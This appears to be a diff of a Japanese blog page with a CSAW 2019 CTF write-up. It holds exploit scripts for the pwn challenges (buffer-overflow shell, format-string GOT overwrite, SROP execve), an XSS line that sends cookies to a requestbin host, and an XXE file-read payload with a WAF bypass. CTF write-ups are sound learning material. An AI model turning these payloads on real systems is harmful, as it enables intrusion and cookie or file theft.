@@ -16,7 +16,7 @@
   $ make life - Csaw2019 writeup 
 </title>
 
-<meta name="generator" content="Hugo 0.53" />
+<meta name="generator" content="Hugo 0.72.0" />
 
 
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
@@ -69,280 +69,242 @@
   <div class="col-md-12 text-justify content">
     
     <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#misc">Misc</a>
-<ul>
-<li><a href="#mcgriddlev2">mcgriddlev2</a></li>
-</ul></li>
-<li><a href="#pwn">Pwn</a>
-<ul>
-<li><a href="#baby-boi-50pt">baby_boi (50pt)</a></li>
-<li><a href="#got-milk-50pt">GOT Milk? (50pt)</a></li>
-<li><a href="#small-boi-100pt">small_boi (100pt)</a></li>
-<li><a href="#traveller">traveller</a></li>
-</ul></li>
-<li><a href="#rev">Rev</a>
-<ul>
-<li><a href="#beleaf">Beleaf</a></li>
-</ul></li>
-<li><a href="#web">Web</a>
-<ul>
-<li><a href="#baby-csp">baby csp</a></li>
-<li><a href="#unagi">unagi</a></li>
-</ul></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#mcgriddlev2">mcgriddlev2</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#baby_boi-50pt">baby_boi (50pt)</a></li>
+        <li><a href="#got-milk-50pt">GOT Milk? (50pt)</a></li>
+        <li><a href="#small_boi-100pt">small_boi (100pt)</a></li>
+        <li><a href="#traveller">traveller</a></li>
+      </ul>
+    </li>
+    <li><a href="#rev">Rev</a>
+      <ul>
+        <li><a href="#beleaf">Beleaf</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#baby-csp">baby csp</a></li>
+        <li><a href="#unagi">unagi</a></li>
+      </ul>
+    </li>
+  </ul>
 </nav>
     
-    
-
-<h2 id="misc">Misc</h2>
-
+    <h2 id="misc">Misc</h2>
 <h3 id="mcgriddlev2">mcgriddlev2</h3>
-
 <ul>
 <li>問題文にFLAGが記載されている</li>
 <li><strong>flag{W3lcome_7o_CSAW_QUALS_2019!}</strong></li>
 </ul>
-
 <h2 id="pwn">Pwn</h2>
-
-<h3 id="baby-boi-50pt">baby_boi (50pt)</h3>
-
+<h3 id="baby_boi-50pt">baby_boi (50pt)</h3>
 <ul>
 <li>シンプルなBOFでIPが奪える問題</li>
 <li>libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う</li>
 </ul>
-
-<pre><code class="language-ruby">#!/usr/bin/env ruby
-# coding: ascii-8bit
-require 'pwn'
-$z = Sock.new &quot;localhost&quot;, 8888
-$z = Sock.new &quot;pwn.chal.csaw.io&quot;, 1005
-libc = ELF.new &quot;./libc-2.27.so&quot;
-#libc = ELF.new &quot;/lib/x86_64-linux-gnu/libc-2.29.so&quot;
-def z; $z; end
-z.recvuntil(&quot;\n&quot;)
-libc_printf = z.recvuntil(&quot;\n&quot;).match(/: (.+)/)[1].to_i(16)
-libc_base = libc_printf - libc.symbols[&quot;printf&quot;]
-puts &quot;%x&quot; % libc_base
-payload = &quot;A&quot; * 40
-payload &lt;&lt; p64(libc_base + 0x4f322)
-z.sendline(payload)
-z.interact
-</code></pre>
-
-<ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+<span style="color:#75715e"># coding: ascii-8bit</span>
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
+$z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#ae81ff">8888</span>
+$z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#ae81ff">1005</span>
+libc <span style="color:#f92672">=</span> <span style="color:#66d9ef">ELF</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;./libc-2.27.so&#34;</span>
+<span style="color:#75715e">#libc = ELF.new &#34;/lib/x86_64-linux-gnu/libc-2.29.so&#34;</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">z</span>; $z; <span style="color:#66d9ef">end</span>
+z<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+libc_printf <span style="color:#f92672">=</span> z<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>match(<span style="color:#e6db74">/: (.+)/</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">].</span>to_i(<span style="color:#ae81ff">16</span>)
+libc_base <span style="color:#f92672">=</span> libc_printf <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;printf&#34;</span><span style="color:#f92672">]</span>
+puts <span style="color:#e6db74">&#34;%x&#34;</span> <span style="color:#f92672">%</span> libc_base
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4f322</span>)
+z<span style="color:#f92672">.</span>sendline(payload)
+z<span style="color:#f92672">.</span>interact
+</code></pre></div><ul>
 <li><strong>flag{baby_boi_dodooo_doo_doo_dooo}</strong></li>
 </ul>
-
 <h3 id="got-milk-50pt">GOT Milk? (50pt)</h3>
-
 <ul>
 <li>独自の共有オブジェクトとバイナリが配られる</li>
 <li><code>set LD_LIBRARY_PATH ./</code> でカレントディレクトリの共有オブジェクトを見るようにする</li>
 <li>FSBがあるので、それを使ってGOT Overwriteする</li>
 </ul>
-
-<pre><code class="language-ruby">#!/usr/bin/env ruby
-# coding: ascii-8bit
-require 'pwn'
-require 'fsa'
-#$z = Sock.new &quot;localhost&quot;, 8888
-$z = Sock.new &quot;pwn.chal.csaw.io&quot;, 1004
-def z; $z; end
-value = 0x89
-fmt = FSA.new()
-fmt[0x804a010] = value
-payload = fmt.payload(7) # index of argument
-puts z.recvuntil(&quot;? &quot;)
-z.sendline(payload)
-puts z.recv
-</code></pre>
-
-<ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+<span style="color:#75715e"># coding: ascii-8bit</span>
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
+require <span style="color:#e6db74">&#39;fsa&#39;</span>
+<span style="color:#75715e">#$z = Sock.new &#34;localhost&#34;, 8888</span>
+$z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#ae81ff">1004</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">z</span>; $z; <span style="color:#66d9ef">end</span>
+value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x89</span>
+fmt <span style="color:#f92672">=</span> <span style="color:#66d9ef">FSA</span><span style="color:#f92672">.</span>new()
+fmt<span style="color:#f92672">[</span><span style="color:#ae81ff">0x804a010</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> value
+payload <span style="color:#f92672">=</span> fmt<span style="color:#f92672">.</span>payload(<span style="color:#ae81ff">7</span>) <span style="color:#75715e"># index of argument</span>
+puts z<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;? &#34;</span>)
+z<span style="color:#f92672">.</span>sendline(payload)
+puts z<span style="color:#f92672">.</span>recv
+</code></pre></div><ul>
 <li><strong>flag{y0u_g00000t_mi1k_4_M3!?}</strong></li>
 </ul>
-
-<h3 id="small-boi-100pt">small_boi (100pt)</h3>
-
+<h3 id="small_boi-100pt">small_boi (100pt)</h3>
 <ul>
 <li>statically linked でstrippedな小さなバイナリが与えられる</li>
 <li>sig_return システムコールを呼ぶようなraxの設定のされ方があるのと自明なBOFがあるので、Sigreturn ROP (SROP) で <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> を実行する
-
 <ul>
 <li>SROPは、スタックの値を使ってsig_return実行時にレジスタの値を代入する攻撃</li>
-<li>これを使ってrdiやrsi、ripなどが設定できるため任意のシステムコールを呼べる
-<br /></li>
-</ul></li>
+<li>これを使ってrdiやrsi、ripなどが設定できるため任意のシステムコールを呼べる</li>
 </ul>
-
-<pre><code class="language-ruby">#!/usr/bin/env ruby
-# coding: ascii-8bit
-require 'pwn'
-#$z = Sock.new &quot;localhost&quot;, 8888
-$z = Sock.new &quot;pwn.chal.csaw.io&quot;, 1002
-def z; $z; end
-payload = &quot;\x00&quot; * 0x28
-payload &lt;&lt; p64(0x40017c)
-payload &lt;&lt; p64(0x0) * 4
-payload &lt;&lt; p64(0x0) * 8 # r8~r15
-payload &lt;&lt; p64(0x4001ca) # rdi = /bin/sh
-payload &lt;&lt; p64(0) # rsi
-payload &lt;&lt; p64(0) # rbp
-payload &lt;&lt; p64(0) # 
-payload &lt;&lt; p64(0) # 
-payload &lt;&lt; p64(0x3b) # rax = 0x3b 
-payload &lt;&lt; p64(0) # rcx
-payload &lt;&lt; p64(0)   # rsp
-payload &lt;&lt; p64(0x00400185) # rip = syscall
-payload &lt;&lt; p64(0x0) # eflags
-payload &lt;&lt; p16(0x33) # cs
-payload &lt;&lt; p16(0)
-payload &lt;&lt; p16(0)
-payload &lt;&lt; p16(0x2b) # ss
-payload &lt;&lt; p64(0x0) * 5 # err ~ union
-payload &lt;&lt; p64(0x0) * 8 # reserved[8]
-z.sendline payload
-z.interact
-</code></pre>
-
-<ul>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+<span style="color:#75715e"># coding: ascii-8bit</span>
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
+<span style="color:#75715e">#$z = Sock.new &#34;localhost&#34;, 8888</span>
+$z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#ae81ff">1002</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">z</span>; $z; <span style="color:#66d9ef">end</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x40017c</span>)
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># r8~r15</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x4001ca</span>) <span style="color:#75715e"># rdi = /bin/sh</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># rsi</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># rbp</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># </span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># </span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x3b</span>) <span style="color:#75715e"># rax = 0x3b </span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># rcx</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0</span>)   <span style="color:#75715e"># rsp</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x00400185</span>) <span style="color:#75715e"># rip = syscall</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># eflags</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p16(<span style="color:#ae81ff">0x33</span>) <span style="color:#75715e"># cs</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p16(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">&lt;&lt;</span> p16(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">&lt;&lt;</span> p16(<span style="color:#ae81ff">0x2b</span>) <span style="color:#75715e"># ss</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span> <span style="color:#75715e"># err ~ union</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># reserved[8]</span>
+z<span style="color:#f92672">.</span>sendline payload
+z<span style="color:#f92672">.</span>interact
+</code></pre></div><ul>
 <li><strong>flag{sigrop_pop_pop_pop}</strong></li>
 </ul>
-
 <h3 id="traveller">traveller</h3>
-
 <ul>
 <li>解けなかったのでwriteupを見た</li>
 <li>Off-by-oneがあるためHeap問題かと思ったら操作対象のインデックスの入力に負数が入力できるOOB問題</li>
-
-<li><p>編集コマンドで、<code>-50</code> をするとfree@gotを書き換えられたのでこれを使って<code>cat_flag</code>関数に飛ばす</p>
-
-<pre><code class="language-ruby">#!/usr/bin/env ruby
-# coding: ascii-8bit
-require 'pwn'
-$z = Sock.new &quot;pwn.chal.csaw.io&quot;, 1003
-#elf = ELF.new &quot;./traveller&quot;
-#libc = ELF.new &quot;./libc-2.23.so&quot;
-context.log_level = :debug
-def z; $z; end
-def add(dist, dest)
-z.sendline &quot;1&quot;
-z.recvuntil &quot;&gt; &quot;
-z.sendline dist.to_s
-z.recvuntil &quot;: &quot;
-z.sendline dest
-z.recvuntil &quot;&gt; &quot;
-end
-def change(dist, dest)
-z.sendline &quot;2&quot;
-z.recvuntil &quot;: &quot;
-z.sendline dist.to_s
-z.send dest
-z.recvuntil &quot;&gt; &quot;
-end
-def delete(dist)
-z.sendline &quot;3&quot;
-z.recvuntil &quot;: &quot;
-z.sendline dist.to_s
-z.recvuntil &quot;&gt; &quot;
-end
-def check(dist)
-z.sendline &quot;4&quot;
-z.recvuntil &quot;&gt;&quot;
-z.sendline dist.to_s
-return z.recvuntil &quot;&gt; &quot;
-end
-tmp = z.recvuntil &quot;&gt; &quot;
-stack_address = tmp.match(/.\n(.*) \n\n/)[1].to_i(16)
-add(1, &quot;AAAAAAAA&quot;)
-change(-50, p64(0x4008b6))
-puts delete(0)
-</code></pre></li>
-
-<li><p><strong>flag{h0pe_y0u_3nj0y_ur_j0urn3y}</strong></p></li>
+<li>編集コマンドで、<code>-50</code> をするとfree@gotを書き換えられたのでこれを使って<code>cat_flag</code>関数に飛ばす</li>
 </ul>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+<span style="color:#75715e"># coding: ascii-8bit</span>
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
+$z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#ae81ff">1003</span>
+<span style="color:#75715e">#elf = ELF.new &#34;./traveller&#34;</span>
+<span style="color:#75715e">#libc = ELF.new &#34;./libc-2.23.so&#34;</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">:debug</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">z</span>; $z; <span style="color:#66d9ef">end</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(dist, dest)
+  z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;1&#34;</span>
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt; &#34;</span>
+  z<span style="color:#f92672">.</span>sendline dist<span style="color:#f92672">.</span>to_s
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;: &#34;</span>
+  z<span style="color:#f92672">.</span>sendline dest
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt; &#34;</span>
+<span style="color:#66d9ef">end</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">change</span>(dist, dest)
+  z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;2&#34;</span>
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;: &#34;</span>
+  z<span style="color:#f92672">.</span>sendline dist<span style="color:#f92672">.</span>to_s
+  z<span style="color:#f92672">.</span>send dest
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt; &#34;</span>
+<span style="color:#66d9ef">end</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(dist)
+  z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;3&#34;</span>
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;: &#34;</span>
+  z<span style="color:#f92672">.</span>sendline dist<span style="color:#f92672">.</span>to_s
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt; &#34;</span>
+<span style="color:#66d9ef">end</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(dist)
+  z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;4&#34;</span>
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt;&#34;</span>
+  z<span style="color:#f92672">.</span>sendline dist<span style="color:#f92672">.</span>to_s
+  <span style="color:#66d9ef">return</span> z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt; &#34;</span>
+<span style="color:#66d9ef">end</span>
+tmp <span style="color:#f92672">=</span> z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt; &#34;</span>
+stack_address <span style="color:#f92672">=</span> tmp<span style="color:#f92672">.</span>match(<span style="color:#e6db74">/.\n(.*) \n\n/</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">].</span>to_i(<span style="color:#ae81ff">16</span>)
+add(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;AAAAAAAA&#34;</span>)
+change(<span style="color:#f92672">-</span><span style="color:#ae81ff">50</span>, p64(<span style="color:#ae81ff">0x4008b6</span>))
+puts delete(<span style="color:#ae81ff">0</span>)
+</code></pre></div><ul>
+<li><strong>flag{h0pe_y0u_3nj0y_ur_j0urn3y}</strong></li>
+</ul>
 <h2 id="rev">Rev</h2>
-
 <h3 id="beleaf">Beleaf</h3>
-
 <ul>
 <li>バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する</li>
 </ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
 
-<pre><code class="language-ruby">#!/usr/bin/env ruby
+idxs <span style="color:#f92672">=</span> <span style="color:#f92672">[</span><span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x4</span>, <span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0x5</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0xa</span>, <span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0xa</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0xa</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x6</span><span style="color:#f92672">]</span>
 
-idxs = [0x1, 0x9, 0x11, 0x27, 0x02, 0x00, 0x12, 0x03, 0x8, 0x12, 0x9, 0x12, 0x11, 0x1, 0x3, 0x13, 0x4, 0x3, 0x5, 0x15, 0x2e, 0xa, 0x3, 0xa, 0x12, 0x3, 0x1, 0x2e, 0x16, 0x2e, 0xa, 0x12, 0x6]
+flag <span style="color:#f92672">=</span> <span style="color:#f92672">[</span><span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x7b</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x6e</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x7d</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x75</span><span style="color:#f92672">].</span>map(<span style="color:#f92672">&amp;</span><span style="color:#e6db74">:chr</span>)
 
-flag = [0x77, 0x66, 0x7b, 0x5f, 0x6e, 0x79, 0x7d, 0x20, 0x62, 0x6c, 0x72, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x61, 0x65, 0x69, 0x20, 0x6f, 0x74, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x67, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75].map(&amp;:chr)
-
-idxs.each do |i|
-  print flag[i]
-end
-</code></pre>
-
-<ul>
+idxs<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>i<span style="color:#f92672">|</span>
+  print flag<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>
+<span style="color:#66d9ef">end</span>
+</code></pre></div><ul>
 <li><strong>flag{we_beleaf_in_your_re_future}</strong></li>
 </ul>
-
 <h2 id="web">Web</h2>
-
 <h3 id="baby-csp">baby csp</h3>
-
 <ul>
 <li>CSPが有効なXSS問題
-
 <ul>
 <li><code>default-src 'self'; script-src 'self' *.google.com; connect-src *</code></li>
-</ul></li>
+</ul>
+</li>
 <li>上記のCSPからJSONPエンドポイントでのXSSを使う
-
 <ul>
 <li><a href="https://inside.pixiv.blog/kobo/5137">https://inside.pixiv.blog/kobo/5137</a></li>
-</ul></li>
+</ul>
+</li>
 <li>FLAGは、Cookieにあるので、requestbin を使ってPOSTさせるJavaScriptを埋め込む</li>
 <li><code>&lt;script src=&quot;https://accounts.google.com/o/oauth2/revoke?callback=navigator.sendBeacon('http://requestbin.net/r/ugix54ug', document.cookie)&quot;&gt;&lt;/script&gt;</code></li>
 <li><strong>flag{csp_will_solve_EVERYTHING}</strong></li>
 </ul>
-
 <h3 id="unagi">unagi</h3>
-
 <ul>
 <li>解けなかったのでwriteupを見た</li>
 <li>XMLがアップロードできるので、XXEだとわかるが、WAFがありいくつかのキーワード(ENTITYやSYSTEMなど)が使えない
-
 <ul>
 <li>PUBLIC は使えたりした</li>
-</ul></li>
+</ul>
+</li>
 <li>結論としては、UTF-8ではなくUTF-16BEでアップロードすればWAFをBypassできるというものだった
-
 <ul>
 <li>試してたが、普通にXXEとしてうまくないファイルだったためこの方針を諦めてしまっていたのが解けない原因っぽい</li>
-</ul></li>
+</ul>
+</li>
 <li><code>cat x.xml | iconv -f UTF-8 -t UTF-16BE &gt; x_utf-16.xml</code> などで作成してアップロードする</li>
 </ul>
-
-<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE root[
-&lt;!ENTITY pass SYSTEM &quot;file:///flag.txt&quot;&gt;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE root[
+</span><span style="color:#75715e">&lt;!ENTITY pass SYSTEM &#34;file:///flag.txt&#34;&gt;</span>
 ]&gt;
-&lt;users&gt;
-  &lt;user&gt;
-    &lt;username&gt;alice2&lt;/username&gt;
-    &lt;password&gt;passwd1&lt;/password&gt;
-    &lt;name&gt;Alice2&lt;/name&gt;
-    &lt;email&gt;alice2@fakesite.com&lt;/email&gt;
-    &lt;group&gt;CSAW2019&lt;/group&gt;
-    &lt;intro&gt;&amp;pass;&lt;/intro&gt;
-  &lt;/user&gt;
-&lt;/users&gt;
-</code></pre>
-
-<ul>
+<span style="color:#f92672">&lt;users&gt;</span>
+  <span style="color:#f92672">&lt;user&gt;</span>
+    <span style="color:#f92672">&lt;username&gt;</span>alice2<span style="color:#f92672">&lt;/username&gt;</span>
+    <span style="color:#f92672">&lt;password&gt;</span>passwd1<span style="color:#f92672">&lt;/password&gt;</span>
+    <span style="color:#f92672">&lt;name&gt;</span>Alice2<span style="color:#f92672">&lt;/name&gt;</span>
+    <span style="color:#f92672">&lt;email&gt;</span>alice2@fakesite.com<span style="color:#f92672">&lt;/email&gt;</span>
+    <span style="color:#f92672">&lt;group&gt;</span>CSAW2019<span style="color:#f92672">&lt;/group&gt;</span>
+    <span style="color:#f92672">&lt;intro&gt;</span>&amp;pass;<span style="color:#f92672">&lt;/intro&gt;</span>
+  <span style="color:#f92672">&lt;/user&gt;</span>
+<span style="color:#f92672">&lt;/users&gt;</span>
+</code></pre></div><ul>
 <li><strong>flag{n0w_i&rsquo;m_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}</strong></li>
 </ul>
 
@@ -406,7 +368,7 @@ end
   
   <h6 class="text-center copyright">© 2019. Chihiro Hasegawa. <a href="https://creativecommons.org/licenses/by/3.0/">Some Rights Reserved</a>.</h6>
   
-  <h6 class="text-center powered">Powered by <a href="https://gohugo.io/">Hugo  v0.53</a> &amp; <a href="https://github.com/shenoybr/hugo-goa">Goa</a>.</h6>
+  <h6 class="text-center powered">Powered by <a href="https://gohugo.io/">Hugo  v0.72.0</a> &amp; <a href="https://github.com/shenoybr/hugo-goa">Goa</a>.</h6>
   
       
       <h6><a href="" aria-label="RSS Feed"><i class="fas fa-rss" aria-hidden="true"></i></a></h6>
